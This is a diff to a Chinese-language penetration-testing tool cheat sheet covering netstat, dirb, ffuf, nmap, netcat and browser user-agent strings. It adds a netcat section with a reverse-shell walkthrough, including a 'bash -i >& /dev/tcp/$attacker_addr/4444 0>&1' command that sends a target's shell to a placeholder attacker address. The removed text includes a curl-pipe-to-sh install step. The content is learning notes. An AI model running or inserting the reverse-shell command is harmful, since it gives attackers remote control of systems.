@@ -1,39 +1,5 @@
 # 指令
 
-## netstat - 网络状态
-
-查询网络状态，如当前建立的连接、路由表
-
-| 选项 | 作用                                                    |
-| ---- | ------------------------------------------------------- |
-| a    | 显示所有连接                                            |
-| b    | 显示各端口对应程序名。需要root权限                      |
-| n    | 显示IP地址而非域名/主机名。不加n好像会做反向DNS，很耗时 |
-| o    | 显示对应进程PID                                         |
-| p    | 指定协议，如`netstat -p "tcp"`                          |
-| r    | 显示路由表                                              |
-
-```shell
-netstat -ano        # 显示所有连接以及对应进程PID
-netstat -nop "tcp"  # 显示所有tcp连接，以及对应进程PID
-netstat -r          # 显示路由表
-netstat -no | findstr "8080"  # 查找指定端口的连接
-```
-
-
-
-## nslookup - DNS查询
-
-DNS查询。`nslookup 域名 [DNS服务器]`；也可以不带参数运行，则进入交互式界面
-
-## curl - Web请求
-
-```shell
-curl example.com
-```
-
-[参考](https://www.ruanyifeng.com/blog/2019/09/curl-reference.html)，[Curl Cookbook](https://catonmat.net/cookbooks/curl)
-
 # 软件
 
 ## Burp Suite
@@ -42,19 +8,7 @@ curl example.com
 
 启动Burp Suite代理服务器，然后打开`http://burp`，从网页下载CA Certificate
 
-- Linux系统安装
-
-```bash
-openssl x509 -inform der -outform pem -in "cacert.der" -out "cacert.crt"  # 从DER格式转为PEM格式
-sudo cp cacert.crt /usr/local/share/ca-certificates  # 复制到证书文件夹
-sudo update-ca-certificates                          # 安装证书
-
-# 检查证书是否成功安装
-cat cacert.crt   # 查看证书内容，复制密钥的一部分
-sudo cat /etc/ssl/certs/ca-certificates.crt | grep L4zOd3  # 查找刚才复制的一小段。若有结果则安装完成
-```
-
-## dirb - 目录扫描
+- dirb - 目录扫描
 
 简单的目录扫描工具。能实现类似功能的还有dirbuster（GUI）和ffuf（模糊测试）等
 
@@ -69,8 +23,6 @@ dirb "example.com"  "/usr/share/dirb/wordlists/big.txt" -o "output.txt"
 | `-z` | 延迟（毫秒）        |
 | `-H` | 请求头，            |
 
-
-
 ## ffuf - 模糊测试
 
 ```shell
@@ -83,7 +35,32 @@ ffuf -v
 
 ## netcat
 
-简称nc，有数据传输、端口监听、远程连接等功能
+简称nc，有建立、监听TCP/UDP连接的功能，可用于简单通信、发送任意数据包。在渗透测试中还常用作反弹shell
+
+**基本操作**
+
+```shell
+# 监听端口（服务端）
+nc -l -p 80
+nc -l -p 80 < index.html  # 监听80端口，建立连接后发送index.html
+
+# 连接主机（客户端）
+nc example.com 80
+nc example.com 80 > index.html  # 连接主机的80端口，建立连接后将受到数据保存为index.html
+```
+
+**反向连接**
+
+1. 攻击者在自己的机器上监听某个端口：`nc -l -p 4444`
+2. 目标主机运行这段指令。具体含义是：`bash -i`以交互模式启动bash；重定向符`>&`将`stdout, stderr`输出到下一个参数；`dev/tcp/addr/port`是与该地址建立TCP连接，并视作伪设备文件；`0>&1`表示将`stdin`重定向到`stdout`
+
+```bash
+bash -i >& "/dev/tcp/$attacker_addr/4444" 0>&1
+```
+
+3. 建立连接后，目标主机将自己的 Shell 输入输出通过该连接传输，攻击者即可操作目标命令行
+
+
 
 ## Nmap - 端口扫描
 
@@ -191,46 +168,6 @@ whatweb -p md5 "example.com"  # 插件
 
 [hash反向查询](https://www.cmd5.com)
 
-# 靶场
-
-## Vulhub
-
-[项目主页](https://vulhub.org/)
-
-1. 安装Docker：`curl -s https://get.docker.com/ | sh `
-2. 下载Vulhub：`git clone https://github.com/vulhub/vulhub.git`
-3. 选择环境：`cd flask/ssti`
-4. 启动靶场：`docker compose up -d`
-5. 访问靶场：用`docker ps`查看端口号、`ip addr show`查看主机ip访问
-6. 关闭靶场：`docker compose down`。为了避免被他人恶意利用，测试结束后一定记得关闭环境
-
-过程中可能报以下错误：
-
-- **`docker: Got permission denied`**：没有docker权限，需要执行以下命令：`sudo groupadd docker`，`sudo usermod -aG docker $USER`，`newgrp docker`
-- **`unexpected keyword argument 'ssl_version'`**：使用`docker compose up -d`指令启动。不要用官方教程的`docker-compose`，那是旧版本的
-- **加载超时**：docker官网被墙了，需要开代理或者换镜像站，设置方法是在`\etc\docker\daemon.json`中加入如下内容（代理或镜像选一个即可）然后重启
-
-```json
-{
-  "proxies": {
-    "http-proxy": "http://proxy.example.com:3128",
-    "https-proxy": "https://proxy.example.com:3129",
-    "no-proxy": "*.test.example.com,.example.org,127.0.0.0/8"
-  }
-
-  "registry-mirrors": ["https://mirror.com"]
-}
-```
-
-## pikachu
-
-1. 安装[小皮面板](https://www.xp.cn/product-download)（Linux），或者[phpStudy](https://www.xp.cn/php-study)（Windows）
-2. 用浏览器登录面板，然后在网站和数据库界面分别安装apache和mysql
-3. 下载pikachu，并复制到`/xp/www`
-4. 在面板的“网站”界面选择添加网站 - 手动创建，域名随便绑一个端口，根目录`/xp/www/pikachu`（即上一步复制的目录），然后点下一步
-5. 随便选个php版本，并创建MySQL数据库。将数据库账号、密码写进`config.inc.php`（位于`/xp/www/pikachu/inc`）
-6. 打开网站（可在面板 - 网站点击网站名打开），访问`/install.php`，点击初始化
-
 # 常用信息
 
 ## 常见默认端口
@@ -265,5 +202,8 @@ Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
 
 # 微信浏览器。微信小程序需要在后面加上miniProgram
 Mozilla/5.0 (Linux; Android 7.1.1; MI 6 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/6.2 TBS/043807 Mobile Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN
+
+# MUMU模拟器微信小程序
+Mozilla/5.0 (Linux; Android 12; M2102J2SC Build/TKQ1.221114.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 MMWEBID/7854 MicroMessenger/8.0.57.2820(0x28003933) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android
 ```
 
